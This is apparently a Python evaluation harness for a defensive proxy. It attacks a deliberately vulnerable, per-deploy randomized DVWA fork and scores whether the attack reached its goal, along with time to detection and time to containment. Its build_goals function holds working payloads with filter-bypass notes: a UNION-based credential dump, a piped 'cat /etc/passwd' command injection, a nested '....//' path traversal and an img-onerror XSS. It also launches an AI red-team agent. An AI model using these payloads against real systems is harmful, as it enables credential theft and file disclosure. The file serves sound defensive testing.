"""End-to-end red-vs-blue scoring harness.

`eval_live.py` already scores Jev's *per-request* quality (precision/recall) on live
traffic. This scores the other axis the project implies: the **mission outcome** of a
live attack and **how fast blue reacted** —

    did the attacker reach its goal (creds exfiltrated? RCE?), and
    MTTD (time to first detection) / MTTR (time to containment) from the event store.

The target is the de-fingerprinted DVWA fork in target_app/, whose paths, params, table
names and creds are **randomized per deploy** (see MUTATION.md). So this harness is
deploy-aware: it reads the running instance's manifest, builds the login + goal payloads
from it, and exploits the *actual* mutated endpoints — nothing DVWA-specific is hardcoded.

Breach is observed AT THE ATTACK SOURCE (the proxy does not store response bodies): the
harness logs in and fires the goal request itself, checking whether the credential dump /
/etc/passwd actually came back. A 403/redirect-to-signin means blue banned the source or
patched the vuln.

Usage (stack up with DEMO_IDENTITY=1, TYPESAFE_API_KEY, MANAGEMENT_TOKEN; a fresh,
un-banned --attacker-ip; an LLM key for --attack agent):
    python score_campaign.py --objectives sqli,cmdi --attack agent --during 90 --json score.json
    python score_campaign.py --objectives sqli --attack agent --attacker-ip 203.0.113.77
"""
import argparse
import json
import os
import re
import subprocess
import sys
import threading
import time
from datetime import datetime

import httpx

from evals import eval_live
from bastion import store
from bastion.dashboard_data import CONTAINMENT          # single source of truth for contain tools
from evals.eval_waf import wilson

PROXY = os.getenv("PROXY_URL", "http://localhost:8080")
# A fresh source by default — the stock red-agent IPs tend to already be denylisted from
# prior runs, which would 403 every request before any fresh detection window exists.
ATTACKER_IP = os.getenv("SCORE_ATTACKER_IP", "203.0.113.77")
TARGET_SERVICE = os.getenv("BASTION_TARGET_SERVICE", "dvwa")  # compose service (internal name kept)

# The goal artifact that proves exfiltration, independent of the per-deploy names.
SIGNATURES = {
    "sqli": re.compile(r"[0-9a-f]{32}"),   # a dumped MD5 credential hash
    "cmdi": re.compile(r"root:.*:0:0:"),    # /etc/passwd root line
    "lfi": re.compile(r"root:.*:0:0:"),     # /etc/passwd read via path traversal
    # reflected XSS: our injected tag served back UNescaped (a '&lt;img' escape won't match)
    "xss": re.compile(r"<img[^>]*onerror=[^>]*BASTIONXSS"),
}

# Reflected-XSS probe: survives DVWA medium (strips only '<script>'); the unique marker
# lets the oracle confirm it came back verbatim rather than output-encoded.
XSS_PAYLOAD = "<img src=x onerror=alert('BASTIONXSS9f')>"

# Manifest "Property" label -> our key. The target writes this table to
# /var/www/data/MUTATION.md at boot (MUTATION.md documents it).
_MANIFEST_KEYS = {
    "Login path": "login_path", "Login user field": "user_field",
    "Login pass field": "pass_field", "CSRF field": "csrf_field",
    "SQLi path": "sqli_path", "SQLi id param": "sqli_param",
    "SQLi submit param": "submit_param", "Cmd-injection path": "cmdi_path",
    "Cmdi host param": "cmdi_param", "LFI path": "lfi_path",
    "LFI file param": "file_param", "XSS path": "xss_path",
    "XSS query param": "q_param", "Users table": "table",
    "username column": "col_account", "password column": "col_cred",
    "Default creds": "creds",
}
_REQUIRED = ("login_path", "user_field", "pass_field", "csrf_field", "sqli_path",
             "sqli_param", "cmdi_path", "cmdi_param", "lfi_path", "file_param",
             "xss_path", "q_param", "table", "col_account", "col_cred",
             "user", "password")


# --- deploy-aware target map -------------------------------------------------------

def parse_manifest(text):
    """Parse the instance MUTATION.md markdown table into the concrete names this
    deploy uses (login/goal paths, params, creds, credential table/columns)."""
    inst = {}
    for line in text.splitlines():
        if not line.lstrip().startswith("|"):
            continue
        cells = [c.strip() for c in line.strip().strip("|").split("|")]
        if len(cells) == 3 and cells[0] in _MANIFEST_KEYS:   # | Property | original | this instance |
            inst[_MANIFEST_KEYS[cells[0]]] = cells[2].strip("` ")
    if "creds" in inst:
        user, _, pw = inst.pop("creds").partition("/")
        inst["user"], inst["password"] = user.strip(), pw.strip()
    missing = [k for k in _REQUIRED if not inst.get(k)]
    if missing:
        raise ValueError(f"instance manifest missing fields: {missing}")
    return inst


def load_instance(service=TARGET_SERVICE, manifest_file=None):
    if manifest_file:
        return parse_manifest(open(manifest_file).read())
    try:
        out = subprocess.run(["docker", "compose", "exec", "-T", service,
                              "cat", "/var/www/data/MUTATION.md"],
                             capture_output=True, text=True, timeout=20)
    except Exception as exc:
        raise SystemExit(f"could not run docker compose exec: {exc}")
    if not out.stdout.strip():
        raise SystemExit(f"empty instance manifest from service {service!r} "
                         f"({out.stderr.strip()}); is the stack up? else pass --manifest-file")
    return parse_manifest(out.stdout)


def build_goals(inst):
    """The medium-level exploit for each objective, in the deploy's own names.
    SQLi: unquoted numeric UNION (string breakout is escaped at medium).
    Cmdi: pipe (`;`/`&&` are stripped at medium)."""
    submit = inst.get("submit_param", "submit")
    return {
        "sqli": {"path": inst["sqli_path"], "signature": SIGNATURES["sqli"],
                 "params": {inst["sqli_param"]:
                            f"0 UNION SELECT {inst['col_account']}, {inst['col_cred']} FROM {inst['table']}",
                            submit: "1"}},
        "cmdi": {"path": inst["cmdi_path"], "signature": SIGNATURES["cmdi"],
                 "params": {inst["cmdi_param"]: "127.0.0.1 | cat /etc/passwd", submit: "1"}},
        # Path traversal out of the docs dir. Medium strips '../' once (non-recursive),
        # so the nested '....//' bypass collapses back to '../'; over-traversal clamps at /.
        "lfi": {"path": inst["lfi_path"], "signature": SIGNATURES["lfi"],
                "params": {inst["file_param"]:
                           "....//....//....//....//....//....//etc/passwd", submit: "1"}},
        # Reflected XSS: <img onerror> dodges the medium '<script>' strip and reflects verbatim.
        "xss": {"path": inst["xss_path"], "signature": SIGNATURES["xss"],
                "params": {inst["q_param"]: XSS_PAYLOAD, submit: "1"}},
    }


# --- breach oracle: log in as the discovered operator, exfiltrate, observe at source ---

def _hidden_value(html, field):
    m = re.search(rf'name=["\']{re.escape(field)}["\'][^>]*value=["\']([^"\']+)', html, re.I)
    return m.group(1) if m else ""


def authenticate(inst, proxy, ip):
    """Sign in with the recon-discoverable operator creds, carrying the CSRF token.
    The vuln modules are session-gated, so the oracle must hold a session like the attacker."""
    client = httpx.Client(base_url=proxy, headers={"X-Forwarded-For": ip},
                          follow_redirects=True, timeout=10)
    page = client.get(inst["login_path"])
    client.post(inst["login_path"], data={
        inst["user_field"]: inst["user"], inst["pass_field"]: inst["password"],
        inst["csrf_field"]: _hidden_value(page.text, inst["csrf_field"])})
    return client


def probe_goal(objective, goals, inst, proxy=PROXY, ip=ATTACKER_IP):
    """Fire the objective's goal request from `ip` (authenticated) and read the response.
    reached = not blocked AND the goal artifact came back. A banned source can't hold a
    session / gets 403, so that returns (False, status)."""
    g = goals[objective]
    try:
        client = authenticate(inst, proxy, ip)
        try:
            resp = client.get(g["path"], params=g["params"])
            reached = resp.status_code not in (403, 429) and bool(g["signature"].search(resp.text))
            return reached, resp.status_code
        finally:
            client.close()
    except Exception:
        return False, None


# --- time helpers (store.now() is ISO8601 UTC, second resolution) ------------------
# ponytail: second-resolution timestamps -> sub-second MTTD/MTTR not measurable; fine
# for a local demo, only matters if containment ever drops under ~1s.

def _parse(ts):
    return datetime.fromisoformat(ts.replace("Z", "+00:00"))


def _seconds(start_ts, end_ts):
    return max(0.0, (_parse(end_ts) - _parse(start_ts)).total_seconds())


# --- blue's reaction, read back from the store over /__api/v1 ----------------------

def _targets_ip(inp, ip):
    return inp.get("ip") == ip or (isinstance(inp.get("ips"), list) and ip in inp["ips"])


def _earlier(cur, ts):
    return ts if cur is None or ts < cur else cur


def detection_and_containment(attack_ip, start_ts, end_ts, proxy=PROXY, token=None):
    """(t_det, t_cont) for the attacker source in-window, or None for either if absent.
    Detection = first malicious recognition (async triage verdict, inline verdict, or an
    inline classifier 403). Containment = first successful IP-targeting contain action."""
    token = token or os.getenv("MANAGEMENT_TOKEN", "")
    det = cont = None
    for item in eval_live._api_pages(proxy, token, "requests", start_ts):
        ts = item.get("ts", "")
        if item.get("ip") != attack_ip or not (start_ts <= ts <= end_ts):
            continue
        verdict = item.get("verdict") or {}
        inline_block = item.get("status") == 403 and item.get("matched") == "classifier"
        if verdict.get("malicious") is True or inline_block:
            det = _earlier(det, ts)
    for item in eval_live._api_pages(proxy, token, "actions", start_ts):
        ts = item.get("ts", "")
        if not (start_ts <= ts <= end_ts):
            continue
        if (item.get("kind") == "triage" and item.get("ip") == attack_ip
                and (item.get("jev") or {}).get("malicious") is True):
            det = _earlier(det, ts)
        if (item.get("kind") == "action" and item.get("tool") in CONTAINMENT
                and item.get("outcome") == "ok" and _targets_ip(item.get("input") or {}, attack_ip)):
            cont = _earlier(cont, ts)
    return det, cont


# --- outcome (pure; unit-tested) ---------------------------------------------------

def classify_outcome(goal_reached, contained):
    if goal_reached:
        return "BREACH"            # attacker got the data — blue did not deny the goal
    if contained:
        return "CONTAINED"         # goal denied AND blue acted on the source
    return "INCONCLUSIVE"          # goal not reached and nothing contained (exploit didn't land)


# --- one live attack ---------------------------------------------------------------

def _load_dotenv(path=".env"):
    """Host-run red_agent/eval_live need the stack's keys and MANAGEMENT_TOKEN; Compose
    loads .env but a host process does not. Fill in only what the real env lacks."""
    try:
        for line in open(path):
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, _, v = line.partition("=")
                os.environ.setdefault(k.strip(), v.strip().strip('"').strip("'"))
    except FileNotFoundError:
        pass


def _run_red_agent(objective, proxy, ip, timeout):
    """Return None if the agent drove the campaign, else an error string (it never ran).
    A silently-dead red_agent (e.g. missing LLM key) would otherwise look like 'blue won'."""
    env = dict(os.environ, PROXY_URL=proxy, ATTACKER_IP=ip)
    try:
        p = subprocess.run([sys.executable, "-m", "bastion.red_agent", objective], env=env,
                           timeout=timeout, capture_output=True, text=True)
        if p.returncode != 0:
            return f"red_agent exited {p.returncode}: {(p.stderr or '').strip()[:200]}"
    except subprocess.TimeoutExpired:
        pass  # ran the whole window; that is fine
    return None


def run_attack(objective, goals, inst, attack="agent", before=0, during=90, after=5,
               proxy=PROXY, attacker_ip=ATTACKER_IP, benign=False):
    if objective not in goals:
        raise SystemExit(f"unknown objective {objective!r}; choices: {sorted(goals)}")

    stop = threading.Event()
    traffic = None
    if benign:  # benign users discovered from the running instance; opt-in only
        from evals import benign_agent
        traffic = threading.Thread(
            target=benign_agent.run,
            kwargs={"duration": before + during + after, "proxy": proxy, "stop": stop},
            daemon=True)
        traffic.start()
    if before:
        time.sleep(before)

    t0 = store.now()
    agent_error = None
    if attack == "agent":
        agent_error = _run_red_agent(objective, proxy, attacker_ip, during)
        if agent_error:
            print(f"  WARN {objective}: {agent_error}", file=sys.stderr)
    else:  # replay the labeled corpus — drives DETECTION only; it cannot exploit the fork
        eval_live.replay(eval_live.load_attacks(), proxy=proxy, ip=attacker_ip)
        time.sleep(max(0, during - 1))

    reached, probe_status = probe_goal(objective, goals, inst, proxy, attacker_ip)
    t_breach = store.now() if reached else None

    if after:
        time.sleep(after)
    if traffic is not None:
        stop.set()
        traffic.join(timeout=5)
    time.sleep(2)  # drain trailing async verdicts/actions before reading
    end = store.now()

    det, cont = detection_and_containment(attacker_ip, t0, end, proxy)
    return {
        "objective": objective, "attack": attack, "mode": os.getenv("BASTION_MODE", "?"),
        "attack_ip": attacker_ip, "goal_reached": reached, "probe_status": probe_status,
        "outcome": classify_outcome(reached, cont is not None),
        "mttd": _seconds(t0, det) if det else None,
        "mttr": _seconds(t0, cont) if cont else None,
        "t0": t0, "t_det": det, "t_cont": cont, "t_breach": t_breach, "t_end": end,
        "agent_error": agent_error,
    }


# --- scoreboard --------------------------------------------------------------------

def scoreboard(results):
    n = len(results)
    breached = sum(r["outcome"] == "BREACH" for r in results)
    contained = sum(r["outcome"] == "CONTAINED" for r in results)
    mttds = [r["mttd"] for r in results if r["mttd"] is not None]
    mttrs = [r["mttr"] for r in results if r["mttr"] is not None]
    return {
        "attacks": n, "breached": breached, "contained": contained,
        "breach_rate": breached / n if n else 0.0,
        "breach_rate_ci": wilson(breached, n) if n else (0.0, 0.0),
        "mean_mttd": sum(mttds) / len(mttds) if mttds else None,
        "mean_mttr": sum(mttrs) / len(mttrs) if mttrs else None,
        "results": results,
    }


def _fmt(sec):
    return f"{sec:.0f}s" if sec is not None else "—"


def print_scoreboard(results):
    board = scoreboard(results)
    print(f"\n{'OBJECTIVE':<10} {'MODE':<20} {'ATTACK':<7} {'OUTCOME':<13} "
          f"{'MTTD':>6} {'MTTR':>6}  GOAL")
    for r in results:
        print(f"{r['objective']:<10} {r['mode']:<20} {r['attack']:<7} {r['outcome']:<13} "
              f"{_fmt(r['mttd']):>6} {_fmt(r['mttr']):>6}  {'yes' if r['goal_reached'] else 'no'}")
    lo, hi = board["breach_rate_ci"]
    print(f"--- {board['attacks']} attacks | contained {board['contained']}/{board['attacks']} | "
          f"breach-rate {board['breach_rate']:.0%} CI[{lo:.0%},{hi:.0%}] | "
          f"mean MTTD {_fmt(board['mean_mttd'])} | mean MTTR {_fmt(board['mean_mttr'])}")
    return board


def main():
    p = argparse.ArgumentParser(description="End-to-end red-vs-blue scoring harness")
    p.add_argument("--objectives", default="sqli,cmdi", help="comma list, e.g. sqli,cmdi")
    p.add_argument("--attack", choices=["agent", "replay"], default="agent",
                   help="agent = recon-capable red_agent (can breach the fork); "
                        "replay = labeled corpus (detection only)")
    p.add_argument("--attacker-ip", default=ATTACKER_IP, help="source IP for the attack (use a fresh, un-banned one)")
    p.add_argument("--before", type=float, default=0)
    p.add_argument("--during", type=float, default=90)
    p.add_argument("--after", type=float, default=5)
    p.add_argument("--proxy", default=PROXY)
    p.add_argument("--benign", action="store_true", help="add benign cross-traffic from benign_agent")
    p.add_argument("--manifest-file", help="read the instance manifest from a file instead of docker exec")
    p.add_argument("--json", dest="json_out", help="write the scoreboard to this path")
    args = p.parse_args()

    _load_dotenv()  # give host-run red_agent the stack's keys + MANAGEMENT_TOKEN
    inst = load_instance(manifest_file=args.manifest_file)
    goals = build_goals(inst)
    eval_live.preflight(args.proxy)
    # One fresh source per objective — a shared IP lets objective N inherit objective
    # N-1's ban/divert and muddies its MTTD/MTTR.
    import ipaddress
    base = ipaddress.ip_address(args.attacker_ip)
    results = [run_attack(obj.strip(), goals, inst, args.attack, args.before, args.during,
                          args.after, args.proxy, str(base + i), benign=args.benign)
               for i, obj in enumerate(o.strip() for o in args.objectives.split(",") if o.strip())]
    board = print_scoreboard(results)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            json.dump(board, fh, indent=2)
        print(f"wrote {args.json_out}")


if __name__ == "__main__":
    main()
